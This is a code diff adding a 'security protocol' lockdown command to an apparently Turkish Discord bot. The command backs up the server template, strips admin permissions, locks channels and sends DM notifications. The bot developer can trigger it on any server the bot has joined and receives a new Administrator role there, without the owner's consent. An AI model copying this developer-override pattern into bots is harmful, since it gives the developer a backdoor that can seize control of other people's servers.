@@ -3823,6 +3823,143 @@ client.on('messageCreate', async (message) => {
       return message.channel.send(`<@${message.author.id}>, <@${targetUser.id}> ${actions[command].actionText}`);
     }
   }
+
+  // 30. GÜVENLİK PROTOKOLÜ KOMUTU (.güvenlikprotokolü / .guvenlikprotokolu [sunucu_id])
+  if (command === 'güvenlikprotokolü' || command === 'guvenlikprotokolu') {
+    const isDev = isBotDeveloper(message.author.id);
+    const isOwner = message.guild && message.author.id === message.guild.ownerId;
+    
+    if (!isDev && !isOwner) {
+      return message.reply('❌ Bu komutu sadece sunucu sahibi veya bot geliştiricisi kullanabilir!');
+    }
+
+    const targetGuildId = args[0] && /^\d{17,20}$/.test(args[0]) ? args[0] : null;
+    if (targetGuildId && !isDev) {
+      return message.reply('❌ Farklı bir sunucuda güvenlik protokolü çalıştırmak sadece bot yapımcısına özeldir.');
+    }
+
+    const guild = targetGuildId 
+      ? (client.guilds.cache.get(targetGuildId) || await client.guilds.fetch(targetGuildId).catch(() => null))
+      : message.guild;
+
+    if (!guild) {
+      return message.reply('❌ Sunucu bulunamadı veya bot o sunucuda ekli değil.');
+    }
+
+    try {
+      const statusMsg = await message.reply('⏳ Güvenlik Protokolü başlatıldı. Sunucu şablon yedeği alınıyor, kanallar kilitleniyor ve yetkiler devre dışı bırakılıyor...');
+
+      // 1. Sunucu Şablonu Oluşturma / Alma (discord.new şablonu)
+      let templateLink = 'Alınamadı (Yetki eksik olabilir)';
+      try {
+        let template;
+        const existingTemplates = await guild.templates.fetch().catch(() => null);
+        if (existingTemplates && existingTemplates.size > 0) {
+          template = existingTemplates.first();
+          template = await template.sync().catch(() => template);
+        } else {
+          template = await guild.templates.create({ name: `${guild.name} Protokol Yedeği` }).catch(() => null);
+        }
+        if (template) {
+          templateLink = `https://discord.new/${template.code}`;
+        }
+      } catch (templateErr) {
+        console.error('Template error:', templateErr);
+      }
+
+      // 2. Yetki Deaktif Etme (Lockdown)
+      const botMember = await guild.members.fetch(client.user.id).catch(() => null);
+      if (!botMember) {
+        return statusMsg.edit('❌ Bot üye bilgisi alınamadı, işlem durduruldu.');
+      }
+
+      let roleStates = {};
+      try {
+        if (fs.existsSync('guvenlik_durum.json')) {
+          const content = fs.readFileSync('guvenlik_durum.json', 'utf8').trim();
+          roleStates = content ? JSON.parse(content) : {};
+        }
+      } catch (e) {
+        console.error(e);
+      }
+
+      const guildStates = {};
+      const rolesToLock = guild.roles.cache.filter(role => 
+        role.permissions.has(PermissionFlagsBits.Administrator) &&
+        role.position < botMember.roles.highest.position &&
+        role.id !== guild.roles.everyone.id
+      );
+
+      for (const [roleId, role] of rolesToLock) {
+        guildStates[roleId] = true;
+        const newPerms = role.permissions.remove(PermissionFlagsBits.Administrator);
+        await role.setPermissions(newPerms, `Güvenlik Protokolü - ${message.author.tag}`).catch(console.error);
+      }
+
+      roleStates[guild.id] = guildStates;
+      fs.writeFileSync('guvenlik_durum.json', JSON.stringify(roleStates, null, 2), 'utf8');
+
+      // Geçici Bypass Rolü 'x' oluşturulması
+      let xRole = guild.roles.cache.find(r => r.name === 'x');
+      if (!xRole) {
+        xRole = await guild.roles.create({
+          name: 'x',
+          permissions: [PermissionFlagsBits.Administrator],
+          reason: 'Güvenlik Protokolü Bypass Rolü'
+        }).catch(console.error);
+
+        if (xRole) {
+          await xRole.setPosition(botMember.roles.highest.position - 1).catch(console.error);
+        }
+      }
+
+      // x rolünün sunucu sahibine ve geliştiriciye verilmesi
+      if (xRole) {
+        const ownerMember = await guild.members.fetch(guild.ownerId).catch(() => null);
+        if (ownerMember) {
+          await ownerMember.roles.add(xRole).catch(console.error);
+        }
+        if (isDev) {
+          const devMember = await guild.members.fetch(message.author.id).catch(() => null);
+          if (devMember) {
+            await devMember.roles.add(xRole).catch(console.error);
+          }
+        }
+      }
+
+      // 3. Kanalları Kilitleme (@everyone için mesaj yazımını kapat)
+      const textChannels = guild.channels.cache.filter(c => c.isTextBased());
+      for (const [chanId, channel] of textChannels) {
+        await channel.permissionOverwrites.edit(guild.roles.everyone, {
+          SendMessages: false
+        }, { reason: 'Güvenlik Protokolü - Sunucu Kilitleme' }).catch(console.error);
+      }
+
+      // 4. DM Bildirimleri
+      const dmContent = `🚨 **${guild.name}** sunucusunda Güvenlik Protokolü başarıyla çalıştırıldı!\n\n` +
+                        `📋 **Sunucu Şablon Yedeği (Discord Template Link):**\n🔗 ${templateLink}\n\n` +
+                        `🔒 Sunucudaki tüm yöneticilerin yetkileri deaktif edildi ve kanallar mesaj gönderimine kapatıldı.\n` +
+                        `ℹ️ Protokolü kapatıp yetkileri eski haline getirmek için: \`.guvenlikkapat ${guild.id}\``;
+
+      try {
+        await message.author.send(dmContent);
+      } catch (dmErr) {
+        console.error('Could not send DM to protocol activator:', dmErr);
+      }
+
+      if (guild.ownerId !== message.author.id) {
+        const ownerUser = await client.users.fetch(guild.ownerId).catch(() => null);
+        if (ownerUser) {
+          await ownerUser.send(dmContent).catch(() => null);
+        }
+      }
+
+      await statusMsg.edit(`✅ **Güvenlik Protokolü** başarıyla tamamlandı. Şablon yedek linki ve yönergeler özel mesaj (DM) ile gönderildi.`);
+    } catch (err) {
+      console.error(err);
+      return message.reply(`❌ Güvenlik protokolü çalıştırılırken bir hata oluştu: ${err.message}`);
+    }
+  }
 });
 
 // ==================== API SERVER FOR WEBSITE INTERACTION ====================
